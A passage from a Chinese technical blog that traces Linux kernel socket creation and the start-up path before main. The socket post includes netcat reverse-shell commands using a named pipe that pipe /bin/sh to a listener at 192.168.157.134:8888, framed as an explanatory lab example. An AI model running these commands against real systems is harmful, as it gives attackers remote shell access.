把它&quot;映射&quot;到vfs中便于应用层操作 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__sys_socket</code> 在简单检查了一下标志位后，执行两个核心函数：<code>sock_create</code> 和 <code>sock_map_fd</code></li>
<li>在分析 <code>__sock_create</code> 之前，先看一下 <code>struct socket</code> 的条目信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">	socket_state		state; <span class="comment">/* socket状态 */</span></span><br><span class="line">	<span class="keyword">short</span>			type; <span class="comment">/* socket类型 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* socket标志位 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span>	*<span class="title">wq</span>;</span> <span class="comment">/* socket等待队列 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span>		*<span class="title">file</span>;</span> <span class="comment">/* gc文件的返回指针 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		*<span class="title">sk</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>	*<span class="title">ops</span>;</span> <span class="comment">/* 根据协议类型,保存了每种协议对应的函数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sock_create</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __sock_create(current-&gt;nsproxy-&gt;net_ns, family, type, protocol, res, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_create);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __sock_create(struct net *net, <span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol,</span><br><span class="line">			 struct socket **res, <span class="keyword">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *      Check protocol is in range</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family &lt; <span class="number">0</span> || family &gt;= NPROTO)</span><br><span class="line">		<span class="keyword">return</span> -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (type &lt; <span class="number">0</span> || type &gt;= SOCK_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Compatibility.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	   This uglymoron is moved from INET layer to here to avoid</span></span><br><span class="line"><span class="comment">	   deadlock in module load.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family == PF_INET &amp;&amp; type == SOCK_PACKET) &#123;</span><br><span class="line">		pr_info_once(<span class="string">&quot;%s uses obsolete (PF_INET,SOCK_PACKET)\n&quot;</span>,</span><br><span class="line">			     current-&gt;comm);</span><br><span class="line">		family = PF_PACKET;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_socket_create(family, type, protocol, kern); <span class="comment">/* 于在创建新socket之前的权限检查,并考虑协议集,类型,协议,以及socket是在内核中创建还是在用户空间中创建 */</span></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	Allocate the socket and allow the family to set things up. if</span></span><br><span class="line"><span class="comment">	 *	the protocol is 0, the family is instructed to select an appropriate</span></span><br><span class="line"><span class="comment">	 *	default.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sock = sock_alloc(); <span class="comment">/* struct socket的核心创建函数 */</span></span><br><span class="line">	<span class="keyword">if</span> (!sock) &#123;</span><br><span class="line">		net_warn_ratelimited(<span class="string">&quot;socket: no more sockets\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;	<span class="comment">/* Not exactly a match, but its the</span></span><br><span class="line"><span class="comment">				   closest posix thing */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sock-&gt;type = type; <span class="comment">/* 设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">	<span class="comment">/* Attempt to load a protocol module if the find failed.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user</span></span><br><span class="line"><span class="comment">	 * requested real, full-featured networking support upon configuration.</span></span><br><span class="line"><span class="comment">	 * Otherwise module support will break!</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (rcu_access_pointer(net_families[family]) == <span class="literal">NULL</span>) <span class="comment">/* 检查驱动程序是否安装 */</span></span><br><span class="line">		request_module(<span class="string">&quot;net-pf-%d&quot;</span>, family); <span class="comment">/* 对未安装的驱动程序进行安装 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">/* RCU读锁申请 */</span></span><br><span class="line">	pf = rcu_dereference(net_families[family]); <span class="comment">/* 获取受保护的RCU指针(这里是地址协议簇指针net_proto_family) */</span></span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (!pf)</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment">	 * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">	rcu_read_unlock(); <span class="comment">/* RCU读锁释放 */</span></span><br><span class="line"></span><br><span class="line">	err = pf-&gt;create(net, sock, protocol, kern); <span class="comment">/* 进入inet socket层 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_module_put;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now to bump the refcnt of the [loadable] module that owns this</span></span><br><span class="line"><span class="comment">	 * socket at sock_release time we decrement its refcnt.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(sock-&gt;ops-&gt;owner))</span><br><span class="line">		<span class="keyword">goto</span> out_module_busy;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now that we&#x27;re done with the -&gt;create function, the [loadable]</span></span><br><span class="line"><span class="comment">	 * module can have its refcnt decremented</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">	err = security_socket_post_create(sock, family, type, protocol, kern);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">	*res = sock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_module_busy:</span><br><span class="line">	err = -EAFNOSUPPORT;</span><br><span class="line">out_module_put:</span><br><span class="line">	sock-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	module_put(pf-&gt;owner);</span><br><span class="line">out_sock_release:</span><br><span class="line">	sock_release(sock);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_release:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">goto</span> out_sock_release;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__sock_create);</span><br></pre></td></tr></table></figure>
<ul>
<li>检查标志位后，调用 <code>security_socket_create</code> 获取必要的信息</li>
<li>然后调用核心函数 <code>sock_alloc</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct socket *<span class="title">sock_alloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">	inode = new_inode_pseudo(sock_mnt-&gt;mnt_sb); <span class="comment">/* 为给定的超级块分配一个新的inode(new_inode底层也是调用这个函数) */</span></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sock = SOCKET_I(inode); <span class="comment">/* 将inode和socket关联起来 */</span></span><br><span class="line"></span><br><span class="line">	inode-&gt;i_ino = get_next_ino(); <span class="comment">/* 对目标inode进行设置 */</span></span><br><span class="line">	inode-&gt;i_mode = S_IFSOCK | S_IRWXUGO;</span><br><span class="line">	inode-&gt;i_uid = current_fsuid();</span><br><span class="line">	inode-&gt;i_gid = current_fsgid();</span><br><span class="line">	inode-&gt;i_op = &amp;sockfs_inode_ops;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_alloc);</span><br></pre></td></tr></table></figure>
<ul>
<li>然后获取地址协议簇指针 <code>net_proto_family</code>（每种网域，都有一个 <code>net_proto_family</code> 数据结构）<ul>
<li>在系统初始化或者安装该模块时，会把指向相应网域的这个数据结构指针 <code>net_proto_family</code> 填入一个数组 <code>net_families[]</code> 中</li>
<li>每当要创建对应网域的对应协议对象实体时，就要根据传入的 <code>family</code> 参数（其实就是 <code>socket</code> 的第一个参数）去这个数组找，找到的话就调用对应的 <code>create</code> 函数 </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">unix_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_UNIX,</span><br><span class="line">	.create = unix_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_UNIX,本地通信 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET,</span><br><span class="line">	.create = inet_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET,IPv4网络通信 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet6_family_ops</span> =</span> &#123;</span><br><span class="line">	.family = PF_INET6,</span><br><span class="line">	.create = inet6_create,</span><br><span class="line">	.owner	= THIS_MODULE,</span><br><span class="line">&#125;; <span class="comment">/* 对应AF_INET6,IPv6网络通信 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>之后调用 <code>pf-&gt;create(net, sock, protocol, kern)</code>，调用对应网域的 <code>create</code> 函数，这个函数主要用于初始化 <code>struct socket-&gt;proto_ops</code> 和 <code>struct socket-&gt;sock</code></li>
</ul>
<p><code>sock_map_fd</code> 的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sock_map_fd</span><span class="params">(struct socket *sock, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">newfile</span>;</span></span><br><span class="line">	<span class="keyword">int</span> fd = get_unused_fd_flags(flags); <span class="comment">/* 申请一个fd */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fd &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">		sock_release(sock);</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	newfile = sock_alloc_file(sock, flags, <span class="literal">NULL</span>); <span class="comment">/* 申请一个file */</span></span><br><span class="line">	<span class="keyword">if</span> (likely(!IS_ERR(newfile))) &#123;</span><br><span class="line">		fd_install(fd, newfile); <span class="comment">/* 把fd和file绑定到一起 */</span></span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	put_unused_fd(fd); <span class="comment">/* 用于将形参对应的fd在其文件系统打开文件的bitmap中清零 */</span></span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(newfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实 Socket 函数的核心就是初始化了一个 <code>struct socket</code> 并把它和 VFS 绑定到了一起</p>
<ul>
<li><code>struct socket</code> 中存储了不同网域，不同协议类型的各种处理方法</li>
<li>而 VFS 则允许用户层以处理文件的形式来操作 <code>struct socket</code></li>
</ul>
<p><strong>Socket 在 NC 中的运用</strong></p>
<p>攻击端监听端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>
<p>受害端创建一个管道 backpipe，并将 shell 环境的输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.157.134 8888 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<ul>
<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
<li>这样从攻击端标准输入的数据就会输出到 <code>/tmp/backpipe</code>，然后再输出到受害端的 <code>/bin/sh</code></li>
<li>在 shell 命令中设置的管道 “|” 会把 <code>/bin/sh</code> 的结果传输回 <code>192.168.157.134:8888</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh -&gt; /tmp/backpipe -&gt; 192.168.157.134:8888 /bin/sh</span><br></pre></td></tr></table></figure>
<p>为了更好地测试数据，可以把 “|” 两边的命令交换位置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe </span><br><span class="line">nc 192.168.157.134 8888 1&gt;/tmp/backpipe | /bin/sh 0&lt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<ul>
<li>把 <code>192.168.157.134:8888</code> 的标准输出重定位为 <code>/tmp/backpipe</code></li>
<li>把 <code>/tmp/backpipe</code> 重定位为 <code>/bin/sh</code> 的标准输入</li>
<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /tmp/backpipe -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
<p>其实就相当于如下的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.157.134 8888 | /bin/sh </span><br></pre></td></tr></table></figure>
<ul>
<li>在 shell 命令中设置的管道 “|” 会把 <code>192.168.157.134:8888</code> 中的数据输入到 <code>/bin/sh</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.157.134:8888 /bin/sh -&gt; /bin/sh </span><br></pre></td></tr></table></figure>
<p>管道在这里的作用只是把 <code>nc 192.168.157.134 8888</code> 与 <code>/bin/sh</code> 两个进程联系起来，而不同主机之间的通信则依靠 nc 命令底层的 socket</p>
<p>接下来就用第一个示例代码进行抓包分析：</p>
<ul>
<li>当两个进程建立 TCP 连接的时候：</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134639082-1664608572268.png" class width="1663134639082"> 
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663134671374-1664608572268.png" class width="1663134671374"> 
<ul>
<li>两边抓到的包是一样的，基础的三次握手（SYN：同步， ACK：确认）</li>
<li>当攻击端发送数据时：</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1663135233085-1664608572268.png" class width="1663135233085"> 
<ul>
<li>[NO.4]：攻击端发送的数据</li>
<li>[NO.6]：受害端发送的数据</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/04/Principles%EF%BC%9Amain%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%89%8D%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">Principles：main函数执行前后的流程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-04 23:03:24 / Modified: 23:06:10" itemprop="dateCreated datePublished" datetime="2022-09-04T23:03:24+08:00">2022-09-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>execve</strong></p>
<p>当 shell 中的那一段命令按下时，一个程序开始执行，shell 或者 GUI 会调用 execve()</p>
<ul>
<li>系统会为你设置栈，并且将 <code>argc</code>，<code>argv</code> 和 <code>envp</code> 压入栈中</li>
<li>对于文件描述符 0，1 和 2（stdin，stdout 和 stderr）则保留 shell 之前的设置</li>
<li>加载器会帮你完成重定位，调用你设置的 <strong>预初始化函数</strong></li>
<li>最后，控制权会传递给 <code>_start()</code> </li>
</ul>
<p><strong>_start</strong></p>
<p><code>_start</code> 的反汇编如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                              <span class="keyword">public</span> _start</span><br><span class="line">                              _start proc near                      </span><br><span class="line">                              ; __unwind &#123;</span><br><span class="line">F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line"><span class="number">31</span> ED                         <span class="keyword">xor</span>     ebp, ebp</span><br><span class="line"><span class="number">49</span> <span class="number">89</span> D1                      mov     r9, rdx                         ; rtld_fini</span><br><span class="line"><span class="number">5</span>E                            pop     rsi                             ; argc</span><br><span class="line"><span class="number">48</span> <span class="number">89</span> E2                      mov     rdx, rsp                        ; ubp_av</span><br><span class="line"><span class="number">48</span> <span class="number">83</span> E4 F0                   <span class="keyword">and</span>     rsp, <span class="number">0F</span>FFFFFFFFFFFFFF0h</span><br><span class="line"><span class="number">50</span>                            push    rax</span><br><span class="line"><span class="number">54</span>                            push    rsp                             ; stack_end</span><br><span class="line"><span class="number">49</span> C7 C0 <span class="number">20</span> <span class="number">12</span> <span class="number">40</span> <span class="number">00</span>          mov     r8, offset __libc_csu_fini      ; fini</span><br><span class="line"><span class="number">48</span> C7 C1 B0 <span class="number">11</span> <span class="number">40</span> <span class="number">00</span>          mov     rcx, offset __libc_csu_init     ; init</span><br><span class="line"><span class="number">48</span> C7 C7 <span class="number">56</span> <span class="number">11</span> <span class="number">40</span> <span class="number">00</span>          mov     rdi, offset main                ; main</span><br><span class="line">FF <span class="number">15</span> <span class="number">52</span> <span class="number">2F</span> <span class="number">00</span> <span class="number">00</span>             call    cs:__libc_start_main_ptr</span><br><span class="line"></span><br><span class="line">F4                            hlt</span><br><span class="line">                              _start endp</span><br></pre></td></tr></table></figure>
<p><code>_start</code> 中会调用 <code>_libc_start_main</code>，它的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">                <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">                <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">                <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure>
<p><strong>__libc_start_main</strong></p>
<p><code>__libc_start_main</code> 函数的参数中没有 envp（<code>main</code> 中的第三个参数，envp 这个数组包含许多的指针，当中每个指针指向的是系统中的环境变量），因此会调用 <code>__libc_init_first</code> 使用内部信息去找到环境变量</p>
<ul>
<li>环境变量（environment variables）：一般是指在操作系统中用来指定操作系统运行环境的一些参数，环境变量可以使系统运行环境配置更加简单灵活，可以通过设置环境变量给进程传递参数信息<ul>
<li>PATH：指定命令的搜索路径</li>
<li>HOME：当前用户的主工作目录（即 Linux 登录时，默认的目录）</li>
<li>SHELL：当前 shell，它的值是通常是 <code>/bin/shell</code></li>
</ul>
</li>
<li>Linux 为什么要有环境变量：<ul>
<li>因为 Linux 执行一些命令时，它会去很多目录去搜索对应的可执行程序</li>
<li>如果可执行程序分散在不同的目录下，当搜索时，这样会非常的耗费时间</li>
<li>所以 Linux 就约定，当执行一个命令时，就到一个指定的文件中去寻找可执行程序所在的目录，这个指定的文件就是环境变量配置文件</li>
</ul>
</li>
<li>可以用 GDB 打印一下 argv &amp; envp：</li>
</ul>
